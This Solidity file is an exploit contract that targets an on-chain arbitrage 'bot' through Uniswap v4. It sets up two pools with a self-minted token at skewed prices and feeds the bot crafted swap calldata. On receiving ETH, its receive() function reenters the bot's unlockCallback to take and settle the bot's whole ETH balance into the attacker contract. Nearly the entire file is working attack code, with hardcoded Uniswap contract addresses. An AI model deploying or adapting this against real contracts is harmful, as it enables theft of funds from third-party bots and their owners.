// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {IPermit2} from "@uniswap/permit2/src/interfaces/IPermit2.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolInitializer_v4} from "@uniswap/v4-periphery/src/interfaces/IPoolInitializer_v4.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {IAllowanceTransfer} from "@uniswap/permit2/src/interfaces/IAllowanceTransfer.sol";
import {IUniversalRouter} from "@uniswap/universal-router/contracts/interfaces/IUniversalRouter.sol";
import {SwapParams} from "@uniswap/v4-periphery/lib/v4-core/src/types/PoolOperation.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

/*
    Overall, the parameters are rough, so the specific values do not have any particular meaning.
*/

contract Exploit {
    IBot immutable BOT;
    bool transient flag;

    Token public immutable TOKEN;

    IPositionManager public immutable POSITION_MANAGER = IPositionManager(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e);
    IPoolManager public immutable POOL_MANAGER = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IPermit2 public immutable PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IUniversalRouter public immutable UNIVERSAL_ROUTER =
        IUniversalRouter(payable(0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af));

    constructor(address botAddr) payable {
        BOT = IBot(botAddr);
        TOKEN = new Token();

        _createPool(0);
        _createPool(1);
    }

    function exploit() external {
        CallData[] memory data = _constructArbitrageParams();
        BOT.execute(abi.encode(data));
    }

    function _createPool(uint256 poolIndex) private {
        PoolKey memory pool = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(TOKEN)),
            fee: uint24(poolIndex),
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });

        uint160 startingPrice = poolIndex == 0 ? 0x1000000000000000000000000 : 71305346262837903834189555302;
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encodeWithSelector(IPoolInitializer_v4.initializePool.selector, pool, startingPrice);

        bytes memory actions = abi.encodePacked(uint8(Actions.MINT_POSITION), uint8(Actions.SETTLE_PAIR));

        bytes[] memory mintParams = new bytes[](2);
        {
            int24 tickLower = -486400;
            int24 tickUpper = 486400;
            uint256 liquidity = 0.05 ether;
            uint128 amount0Max = 0.1 ether;
            uint128 amount1Max = 0.1 ether;
            address owner = address(this);
            bytes memory hookData = bytes("");

            mintParams[0] = abi.encode(pool, tickLower, tickUpper, liquidity, amount0Max, amount1Max, owner, hookData);
            mintParams[1] = abi.encode(Currency.wrap(address(0)), Currency.wrap(address(TOKEN)));
        }

        uint256 deadline = block.timestamp + 60;
        params[1] = abi.encodeWithSelector(
            IPositionManager.modifyLiquidities.selector, abi.encode(actions, mintParams), deadline
        );

        TOKEN.approve(address(PERMIT2), type(uint256).max);
        IAllowanceTransfer(address(PERMIT2)).approve(
            address(TOKEN), address(POSITION_MANAGER), type(uint160).max, type(uint48).max
        );

        POSITION_MANAGER.multicall{value: 0.1 ether}(params);
    }

    function _constructArbitrageParams() private view returns (CallData[] memory) {
        CallData[] memory data = new CallData[](3);

        {
            PoolKey memory poolKey = PoolKey({
                currency0: Currency.wrap(address(0)),
                currency1: Currency.wrap(address(TOKEN)),
                fee: 0,
                tickSpacing: 200,
                hooks: IHooks(address(0))
            });
            SwapParams memory swapParams = SwapParams({
                zeroForOne: true,
                amountSpecified: -0.001 ether,
                sqrtPriceLimitX96: uint160(type(uint80).max)
            });

            data[0].selector = IPoolManager.swap.selector;
            data[0].params = abi.encode(poolKey, swapParams, bytes(""));
        }

        {
            PoolKey memory poolKey = PoolKey({
                currency0: Currency.wrap(address(0)),
                currency1: Currency.wrap(address(TOKEN)),
                fee: 1,
                tickSpacing: 200,
                hooks: IHooks(address(0))
            });
            SwapParams memory swapParams =
                SwapParams({zeroForOne: false, amountSpecified: -980392156862745, sqrtPriceLimitX96: type(uint152).max});

            data[1].selector = IPoolManager.swap.selector;
            data[1].params = abi.encode(poolKey, swapParams, bytes(""));
        }

        data[2].selector = IPoolManager.take.selector;
        data[2].params = abi.encode(Currency.wrap(address(0)), address(BOT), 184552264062947);

        return data;
    }

    receive() external payable {
        if (!flag) {
            flag = true;
            CallData[] memory data2 = new CallData[](2);
            data2[0].selector = IPoolManager.take.selector;
            data2[0].params = abi.encode(Currency.wrap(address(0)), address(this), address(BOT).balance);
            data2[1].selector = IPoolManager.settle.selector;
            data2[1].value = address(BOT).balance;

            CallData[] memory data = new CallData[](1);

            data[0].selector = IPoolManager.unlock.selector;
            data[0].params = abi.encode(abi.encode(data2));

            BOT.unlockCallback(abi.encode(data));
            flag = false;
        }
    }
}

contract Token is ERC20 {
    constructor() ERC20("Token", "TKN") {
        _mint(msg.sender, 1_000_000 * 10 ** decimals());
    }
}

struct CallData {
    bytes4 selector;
    uint256 value;
    bytes params;
}

interface IBot {
    function execute(bytes calldata data) external payable;
    function unlockCallback(bytes calldata data) external returns (bytes memory);
}
